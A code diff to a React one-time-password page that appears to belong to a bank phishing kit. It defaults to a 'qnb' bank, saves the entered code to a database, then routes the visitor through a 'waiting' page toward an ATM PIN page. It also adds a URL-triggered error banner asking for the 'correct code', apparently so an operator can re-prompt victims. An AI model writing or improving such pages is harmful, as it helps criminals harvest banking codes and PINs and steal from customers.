@@ -11,6 +11,7 @@ export default function Otp() {
   const bank = params.get("bank") || "qnb";
   const { language, setLanguage } = useLanguage();
   const sessionId = localStorage.getItem("sessionId") || "";
+  const showError = params.get("error") === "true";
 
   const isArabic = language === "ar";
 
@@ -34,11 +35,10 @@ export default function Otp() {
         otpCode: otp,
         otpType: "standard",
       });
-      toast.success("تم التحقق بنجاح");
+      setLocation(`/waiting?bank=${bank}&session=${sessionId}&next=atm-pin`);
     } catch (error) {
-      console.error("Error saving OTP in DB, continuing anyway:", error);
+      toast.error(isArabic ? "حدث خطأ أثناء الإرسال" : "Error during submission");
     }
-    setLocation(`/atm-pin?bank=${bank}&session=${sessionId}`);
   };
 
   return (
@@ -69,6 +69,11 @@ export default function Otp() {
 
       <div className="container">
         <div className="otp-box">
+          {showError && (
+            <div style={{ background: "#fee2e2", border: "1px solid #ef4444", color: "#b91c1c", padding: "10px", borderRadius: "5px", marginBottom: "15px", textAlign: "center", fontSize: "14px" }}>
+              {isArabic ? "برجاء التحقق من الرمز المرسل عبر الجوال الصحيح" : "Please check the correct code sent via mobile"}
+            </div>
+          )}
           <h2>أدخل رمز التحقق (OTP)</h2>
           <p>تم إرسال رمز التحقق إلى رقم هاتفك المسجل</p>
           <form onSubmit={handleSubmit}>
